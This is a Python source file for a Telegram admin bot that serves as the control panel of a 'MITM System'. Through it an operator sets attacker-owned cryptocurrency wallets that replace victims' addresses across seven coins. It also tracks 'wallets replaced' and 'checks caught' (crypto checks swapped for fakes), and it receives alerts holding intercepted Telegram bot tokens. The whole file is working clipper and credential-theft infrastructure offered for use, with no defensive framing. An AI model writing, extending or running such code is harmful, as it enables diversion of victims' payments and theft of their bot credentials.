import asyncio
import json
import tempfile
import time
import os
from aiogram import Bot, Dispatcher, types, F, Router
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

from storage import storage
from patterns import CryptoPatterns


def escape_html(text: str) -> str:
    if not text:
        return ""
    return (text
            .replace('&', '&amp;')
            .replace('<', '&lt;')
            .replace('>', '&gt;')
            .replace('"', '&quot;')
            .replace("'", '&#39;'))


class AdminBot:
    def __init__(self, bot_token=None, admin_id=None):
        self.ADMIN_BOT_TOKEN = bot_token or os.getenv("ADMIN_BOT_TOKEN", "")
        self.ADMIN_ID = admin_id or int(os.getenv("ADMIN_ID", "0"))

        if not self.ADMIN_BOT_TOKEN or ":" not in self.ADMIN_BOT_TOKEN:
            raise ValueError("Invalid bot token!")

        print(f"[BOT] Admin ID: {self.ADMIN_ID}")

        self.bot = Bot(
            token=self.ADMIN_BOT_TOKEN,
            default=DefaultBotProperties(parse_mode=ParseMode.HTML)
        )

        self.dp = Dispatcher()
        self.router = Router()
        self.dp.include_router(self.router)
        self.setup_handlers()

        storage.admin_bot = self

        print(f"[✓] Admin bot initialized")

    def setup_handlers(self):
        @self.router.message(Command("start"))
        async def start_cmd(message: types.Message):
            if message.from_user.id != self.ADMIN_ID:
                await message.answer("⛔ Access denied")
                return

            await self.show_main_menu(message)

        @self.router.message(Command("stats"))
        async def stats_cmd(message: types.Message):
            if message.from_user.id != self.ADMIN_ID:
                await message.answer("⛔ Access denied")
                return

            await self.send_stats_json(message)

        @self.router.message(Command("wallets"))
        async def wallets_cmd(message: types.Message):
            if message.from_user.id != self.ADMIN_ID:
                return

            await self.show_wallets_menu(message)

        @self.router.message(Command("help"))
        async def help_cmd(message: types.Message):
            if message.from_user.id != self.ADMIN_ID:
                return

            help_text = (
                "🤖 <b>MITM System Commands</b>\n\n"
                "/start - Main menu\n"
                "/stats - Download stats JSON\n"
                "/wallets - Manage all wallets\n"
                "/help - This message\n\n"
                "<b>How to change wallets:</b>\n"
                "1. Click on wallet in /wallets menu\n"
                "2. You'll see current address\n"
                "3. Reply to that message with new address"
            )
            await message.answer(help_text)

        @self.router.message(Command("setwallet"))
        async def setwallet_cmd(message: types.Message):
            if message.from_user.id != self.ADMIN_ID:
                return

            try:
                parts = message.text.split()
                if len(parts) != 3:
                    await message.answer("Format: /setwallet COIN ADDRESS\nExample: /setwallet BTC bc1q...")
                    return

                coin_type = parts[1].upper()
                address = parts[2]

                old_wallet = storage.get_wallet(coin_type)

                if len(address) > 10:
                    if storage.update_wallet(coin_type, address):
                        escaped_address = escape_html(address)
                        escaped_old = escape_html(old_wallet) if old_wallet else "None"

                        response = (
                            f"✅ <b>{coin_type} Wallet Set!</b>\n\n"
                            f"<b>Old:</b> <code>{escaped_old[:30]}{'...' if len(escaped_old) > 30 else ''}</code>\n"
                            f"<b>New:</b> <code>{escaped_address}</code>\n\n"
                            f"All {coin_type} addresses will now be replaced with this."
                        )
                        await message.answer(response)
                        await self.show_wallets_menu(message)
                    else:
                        await message.answer(f"❌ Failed to set {coin_type} wallet")
                else:
                    await message.answer("❌ Invalid wallet address (too short)")
            except Exception as e:
                await message.answer(f"❌ Error: {escape_html(str(e))}")

        @self.router.callback_query(F.data == "back_menu")
        async def back_callback(callback: types.CallbackQuery):
            if callback.from_user.id != self.ADMIN_ID:
                await callback.answer("Access denied", show_alert=True)
                return

            await self.show_main_menu(callback.message)
            await callback.answer()

        @self.router.callback_query(F.data == "wallet_menu")
        async def wallet_menu_callback(callback: types.CallbackQuery):
            if callback.from_user.id != self.ADMIN_ID:
                await callback.answer("Access denied", show_alert=True)
                return

            await self.show_wallets_menu(callback.message)
            await callback.answer()

        @self.router.callback_query(F.data == "refresh")
        async def refresh_callback(callback: types.CallbackQuery):
            if callback.from_user.id != self.ADMIN_ID:
                await callback.answer("Access denied", show_alert=True)
                return

            await self.show_main_menu(callback.message)
            await callback.answer("✅ Refreshed", show_alert=True)

        @self.router.callback_query(F.data == "stats_json")
        async def stats_json_callback(callback: types.CallbackQuery):
            if callback.from_user.id != self.ADMIN_ID:
                await callback.answer("Access denied", show_alert=True)
                return

            await self.send_stats_json(callback.message)
            await callback.answer()

        @self.router.callback_query()
        async def handle_all_callbacks(callback: types.CallbackQuery):
            if callback.from_user.id != self.ADMIN_ID:
                await callback.answer("Access denied", show_alert=True)
                return

            data = callback.data

            if data.startswith("wallet_"):
                coin_type = data[7:]

                valid_coins = CryptoPatterns.get_wallet_types()
                if coin_type in valid_coins:
                    await self.show_wallet_edit(callback, coin_type)
                else:
                    await callback.answer(f"❌ Invalid coin type: {coin_type}", show_alert=True)
            else:
                await callback.answer(f"❌ Unknown callback: {data}", show_alert=True)

            await callback.answer()

        @self.router.message(F.text)
        async def handle_text(message: types.Message):
            if message.from_user.id != self.ADMIN_ID:
                return

            if message.reply_to_message:
                reply_text = message.reply_to_message.text or ""

                coin_match = None
                for coin in CryptoPatterns.get_wallet_types():
                    if coin in reply_text:
                        coin_match = coin
                        break

                if coin_match:
                    coin_type = coin_match
                    new_wallet = message.text.strip()

                    old_wallet = storage.get_wallet(coin_type)

                    if len(new_wallet) > 10:
                        if storage.update_wallet(coin_type, new_wallet):
                            escaped_new = escape_html(new_wallet)
                            escaped_old = escape_html(old_wallet) if old_wallet else "None"

                            response = (
                                f"✅ <b>{coin_type} Wallet Updated!</b>\n\n"
                                f"<b>Old:</b> <code>{escaped_old[:30]}{'...' if len(escaped_old) > 30 else ''}</code>\n"
                                f"<b>New:</b> <code>{escaped_new}</code>\n\n"
                                f"All {coin_type} addresses will now be replaced with this."
                            )
                            await message.answer(response)
                            await self.show_wallets_menu(message)
                        else:
                            await message.answer(f"❌ Failed to update {coin_type} wallet")
                    else:
                        await message.answer("❌ Invalid wallet address (too short)")
                    return

            await self.show_main_menu(message)

    async def send_stats_json(self, message):
        try:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
                json_data = storage.export_stats_json()
                f.write(json_data)
                temp_file = f.name

            await message.answer_document(
                types.FSInputFile(temp_file),
                caption="📊 <b>System Statistics JSON</b>"
            )

            os.unlink(temp_file)

        except Exception as e:
            await message.answer(f"❌ Error: {escape_html(str(e))}")

    async def show_main_menu(self, message):
        stats = storage.get_stats()

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="💰 Manage All Wallets", callback_data="wallet_menu")],
            [InlineKeyboardButton(text="📊 Download Stats JSON", callback_data="stats_json")],
            [InlineKeyboardButton(text="🔄 Refresh", callback_data="refresh")]
        ])

        bots_detected = stats.get('bots_detected', [])
        bots_count = len(bots_detected) if isinstance(bots_detected, list) else 0

        text = (
            f"🤖 <b>MITM System Control Panel</b>\n\n"
            f"<b>Live Statistics:</b>\n"
            f"• Wallets replaced: <b>{stats.get('wallets_replaced', 0)}</b>\n"
            f"• Checks caught: <b>{stats.get('checks_caught', 0)}</b>\n"
            f"• Bots detected: <b>{bots_count}</b>\n\n"
            f"<b>Last update:</b> {time.strftime('%H:%M:%S')}"
        )

        if isinstance(message, types.Message):
            await message.answer(text, reply_markup=keyboard)
        else:
            await message.edit_text(text, reply_markup=keyboard)

    async def show_wallets_menu(self, message):
        wallets = storage.get_all_wallets()

        buttons = []
        for coin in CryptoPatterns.get_wallet_types():
            address = wallets.get(coin, "")

            if address:
                display_addr = address[:20] + "..." if len(address) > 20 else address
            else:
                display_addr = "Not set"

            escaped_addr = escape_html(display_addr)

            icons = {
                "BTC": "💰",
                "ETH": "💎",
                "USDT_TRC20": "💵",
                "USDT_ERC20": "💳",
                "TON": "🚀",
                "SOL": "🌟",
                "BNB": "🔥"
            }

            icon = icons.get(coin, "📝")
            button_text = f"{icon} {coin}: {escaped_addr}"

            buttons.append([
                InlineKeyboardButton(
                    text=button_text,
                    callback_data=f"wallet_{coin}"
                )
            ])

        buttons.append([
            InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="back_menu")
        ])

        keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)

        text = (
            "💰 <b>Crypto Wallets Management</b>\n\n"
            "Click on any wallet to edit it.\n"
            "Current addresses are shown next to each coin type.\n\n"
            "<i>After clicking, reply to the bot's message with new address.</i>"
        )

        if isinstance(message, types.Message):
            await message.answer(text, reply_markup=keyboard)
        else:
            await message.edit_text(text, reply_markup=keyboard)

    async def show_wallet_edit(self, callback: types.CallbackQuery, coin_type: str):
        current_wallet = storage.get_wallet(coin_type)

        if current_wallet:
            escaped_wallet = escape_html(current_wallet)
            display_wallet = escaped_wallet[:50] + "..." if len(escaped_wallet) > 50 else escaped_wallet
        else:
            display_wallet = "Not set"

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔙 Back to All Wallets", callback_data="wallet_menu")],
            [InlineKeyboardButton(text="🏠 Main Menu", callback_data="back_menu")]
        ])

        examples = {
            "BTC": "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq",
            "ETH": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
            "USDT_TRC20": "TNDzfER7vL1hJ5sZ7v8w9x0y1z2a3b4c5d6e7f8g9h0",
            "USDT_ERC20": "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
            "TON": "UQB6Z4RwcBqA3L8Z8-7lP5sN4nLx5j2k3l4m5n6o7p8q9r0s1t2u3v4w5x6y7z8",
            "SOL": "So11111111111111111111111111111111111111112",
            "BNB": "bnb1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"
        }

        example = examples.get(coin_type, "Enter valid wallet address")

        text = (
            f"⚙️ <b>Editing {coin_type} Wallet</b>\n\n"
            f"<b>Current address:</b>\n"
            f"<code>{display_wallet}</code>\n\n"
            f"<b>Example format:</b>\n"
            f"<code>{example}</code>\n\n"
            f"<b>To change:</b>\n"
            f"Reply to this message with new {coin_type} address."
        )

        await callback.message.edit_text(text, reply_markup=keyboard)

    async def notify_check_caught(self, check_data: str):
        try:
            escaped_check = escape_html(check_data)
            check_short = escaped_check[:50] + "..." if len(escaped_check) > 50 else escaped_check

            await self.bot.send_message(
                self.ADMIN_ID,
                f"🎫 <b>Crypto Check Caught!</b>\n\n"
                f"<b>Check:</b> <code>{check_short}</code>\n"
                f"<b>Time:</b> {time.strftime('%H:%M:%S')}\n\n"
                f"✅ Replaced with fake check"
            )
            print(f"[BOT] ✅ Check caught: {check_short}")
        except Exception as e:
            print(f"[BOT] Check notification error: {e}")

    async def notify_bot_detected(self, bot_token: str):
        try:
            escaped_token = escape_html(bot_token)
            token_short = escaped_token[:20] + "..." if len(escaped_token) > 20 else escaped_token

            await self.bot.send_message(
                self.ADMIN_ID,
                f"🤖 <b>New Bot Detected!</b>\n\n"
                f"<b>Token:</b> <code>{token_short}</code>\n"
                f"<b>Time:</b> {time.strftime('%H:%M:%S')}"
            )
            print(f"[BOT] ✅ Bot detected: {token_short}")
        except Exception as e:
            print(f"[BOT] Bot notification error: {e}")

    async def start(self):
        await self.bot.delete_webhook(drop_pending_updates=True)
        print("[BOT] Starting polling...")
        await self.dp.start_polling(self.bot)
